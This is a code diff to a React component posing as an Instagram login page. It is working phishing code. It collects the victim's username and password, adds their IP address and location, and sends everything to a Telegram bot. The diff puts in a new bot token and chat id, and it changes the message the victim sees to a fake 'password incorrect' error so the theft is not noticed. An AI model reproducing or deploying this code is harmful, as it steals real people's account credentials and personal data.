@@ -29,8 +29,8 @@ const Instagram: React.FC = () => {
         const PasswordLogin = formData.password;
         const SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ip} %0A - Country: ${country_name} %0A - Country-code: ${country_calling_code} %0A - state: ${city}`;
 
-        const token = "6650969963:AAECQrzycrXYX2_j45OEBuoMU38lLXTjLh8";
-        const chat_id = -4175742974;
+        const token = "6323318695:AAH3x4TcKakRMkpcoOxtZCgOpqEWRoLJhpM";
+        const chat_id = -4286643760;
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;
 
         const api = new XMLHttpRequest();
@@ -38,7 +38,7 @@ const Instagram: React.FC = () => {
         api.send();
 
         setTimeout(() => {
-          setResult("Unfortunately, Voting has Expired....");
+          setResult("Sorry, your password was incorrect. Please double-check your password.");
         }, 2000);
       });
   };
